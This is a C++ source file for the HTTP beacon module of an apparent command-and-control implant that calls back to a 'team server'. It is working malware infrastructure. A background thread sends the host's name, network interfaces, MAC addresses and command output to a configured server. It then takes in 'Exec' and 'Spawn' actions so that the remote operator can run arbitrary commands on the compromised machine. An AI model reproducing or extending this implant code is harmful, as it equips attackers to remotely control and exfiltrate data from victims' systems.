#include "pch.h"
#include "Config.h"
#include "arsenalHttp.h"
#include "HTTPRequest.hpp"

ArsenalHttp::ArsenalHttp() {}

ArsenalHttp::ArsenalHttp(LightBringer *man) {
    this->manager = man;
}

void ArsenalHttp::Init() {
    // std::cout << "ArsenalHttp::Init: Starting" << std::endl;
    std::thread(&ArsenalHttp::Start, this).detach();
}

void ArsenalHttp::Start() {
    using nlohmann::json;

    std::ostringstream ss;
    ss << "http://" << ARSENAL_TEAMSERVER << "/";
    http::Request request(ss.str());
    ss.str("");

    http::Response response;
    bool firstBeacon = false;
    APITPtr actionResponseAPI;  // Send to Team Server
    APITPtr actionAPI = std::make_unique<anomaly::APIT>();  // Put in Queue to send bot
    json jToTeamServer;
    json jFromTeamServer;
    std::string strResponse;
    std::vector<uint8_t> rawFromTeamServer;

    while (true) {
        // If queue is empty, sleep a little then check again
        //goto Testing;
        if (this->manager->GetActionResponseSize() == 0) {
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
            continue;
        }

        // std::cout << "ArsenalHttp: Got ActionResponse." << std::endl;

        actionResponseAPI = this->manager->PopActionResponse();

        // Convert APIT into JSON and send to the Team Server
        APIT_To_ArsenalJson(jToTeamServer, *actionResponseAPI);
        jToTeamServer["login_api_key"] = ARSENAL_API_KEY;

        // std::cout << "ArsenalHttp: jToTeamServer: " << std::endl;
        // std::cout << jToTeamServer.dump() << std::endl;

        // If UUID is populated, it's the first beacon for this bot
        if (!actionResponseAPI->uuid.empty()) {
            jToTeamServer["method"] = "CreateSession";
            firstBeacon = true;
        } else {
            jToTeamServer["method"] = "SessionCheckIn";
        }

        try {
            // Send Json to Team Server
            response = request.send("POST", jToTeamServer.dump(), {
                "Content-Type: application/json"
            });

            // std::cout << "ArsenalHttp::Start: response.body.data(): " << response.body.data() << std::endl;
        } catch (const std::exception& e) {
            std::cout << "ArsenalHttp::Start: Request failed. Error: " << e.what() << std::endl;
            goto Cleanup;
        }

        ss << response.body.data();
        strResponse = ss.str();

        rawFromTeamServer.assign(response.body.begin(), response.body.end() - 1);

        ss.str("");
        strResponse = "";
        strResponse.assign(rawFromTeamServer.begin(), rawFromTeamServer.end());

        //strResponse = ss.str();

        // std::cout << "ArsenalHttp::Start: strResponse: " << strResponse << std::endl;

        try {
            jFromTeamServer = json::parse(strResponse);
        } catch (json::exception& e) {
            std::cout << "ArsenalHttp::Start: Failed parsing Json from Team Server." << std::endl;
            std::cout << "Error: " << e.what() << "\n" << "Exception ID: " << e.id << std::endl;
            goto Cleanup;
        }

        if (jFromTeamServer["error"] == true) {
            std::cout << "ArsenalHttp::Start: Team Server responded with an error." << std::endl;
            goto Cleanup;
        }

        // Convert Team Server response to APIT
        APIT_From_ArsenalJson(jFromTeamServer, *actionAPI);

        // If firstBeacon, add UUID to APIT so BlackIce and other modules can track it
        if (firstBeacon) {
            actionAPI->uuid = actionResponseAPI->uuid;
            firstBeacon = false;
        }

        this->manager->PushAction(std::move(actionAPI));
        actionAPI = std::make_unique<anomaly::APIT>();

Cleanup:
        firstBeacon = false;
        jToTeamServer.clear();
        jFromTeamServer.clear();
        ss.str("");
    }
}

void ArsenalHttp::APIT_To_ArsenalJson(nlohmann::json& j, const anomaly::APIT& a) {
    using nlohmann::json;

    // If sending Initialization
    if (a.sessionId == "" || a.sessionId == "-1") {
        j["target_uuid"] = a.uuid;
        j["config"] = json{
            { "agent_version", a.config->agentVersion },
            { "interval", a.config->interval },
            { "interval_delta", a.config->intervalDelta },
            { "servers", a.config->servers }
        };
        j["facts"]["hostname"] = a.hostname;

        std::string tempIpString;
        for (unsigned int i = 0; i < a.interfaces.size(); i++) {
            j["facts"]["interfaces"] += json{
                { "name", a.interfaces.at(i)->name },
                { "mac_addr", a.interfaces.at(i)->macAddr }
            };


            // Figure out how to get IP addresses
            //for (int j = 0; j < a.interfaces.at(i)->ipAddrs.size(); j++) {
            
            //    tempIpString = a.interfaces.at(i)->name.at(j);
            //    j["facts"]["interfaces"][tempIpString.c_str()] = a.interfaces.at(i)->ipAddrs.at(j);
            //}
        }
    } else {
        j["session_id"] = a.sessionId;
    }

    // If there are ActionResponses, loop through and serialize them to json
    if (!a.responses.empty()) {
        // IMPORTANT: This will probably break if there is a response for an actionType
        // other than Exec right now
        for (unsigned int i = 0; i < a.responses.size(); i++) {
            if (a.responses.at(i)->config != NULL) {
                j["responses"] += json{
                    { "action_id", a.responses.at(i)->actionId },
                    
                };
            } else {
                j["responses"] += json{
                    { "action_id", a.responses.at(i)->actionId },
                    { "start_time",  a.responses.at(i)->startTime },
                    { "end_time", a.responses.at(i)->endTime },
                    { "stdout", a.responses.at(i)->stdoutput },
                    { "stderr", a.responses.at(i)->stderror },
                    { "error", a.responses.at(i)->error }
                };
            }
        }
    }
}

void ArsenalHttp::APIT_From_ArsenalJson(const nlohmann::json& j, anomaly::APIT& a) {
    using nlohmann::json;
    using namespace anomaly;

    a.sessionId = j.at("session_id").get<std::string>();

    if (j.find("actions") != j.end()) {
        // Get actions from json and add them to a.actions

        auto tempAction = std::make_unique<ActionT>();

        for (json jTempAction : j["actions"]) {
            tempAction->actionId = jTempAction.at("action_id").get<std::string>();
            tempAction->actionType = static_cast<ActionType>(jTempAction.at("action_type").get<int>());
            if (tempAction->actionType == ActionType_Config) {
                tempAction->config = std::make_unique<ConfigT>();
                if (jTempAction.at("config").find("interval") != jTempAction.at("config").end())
                    tempAction->config->interval = (jTempAction.at("config").at("interval").get<int>());
                else
                    tempAction->config->interval = -1;

                if (jTempAction.at("config").find("interval_delta") != jTempAction.at("config").end())
                    tempAction->config->intervalDelta = jTempAction.at("config").at("interval_delta").get<int>();
                else
                    tempAction->config->intervalDelta = -1;

                if (jTempAction.at("config").find("servers") != jTempAction.at("config").end())
                    for (std::string server : jTempAction.at("config").at("servers")) {
                    //jTempAction.at("config").at("servers").get_to(tempAction->config->servers);
                        //std::string server = jTempAction.at("config").at("servers")[i].get<std::string>();
                        tempAction->config->servers.push_back(server);
                    }
            } else if (tempAction->actionType == ActionType_Exec || tempAction->actionType == ActionType_Spawn) {
                tempAction->command = jTempAction.at("command").get<std::string>();
                jTempAction.at("args").get_to(tempAction->args);
            } else {
                // std::cout << "ArsenalHttp::APIT_From_Json: from_json: ActionType not implemented..." << std::endl;
                continue;
            }
            a.actions.emplace_back(std::move(tempAction));
        }
    }
}
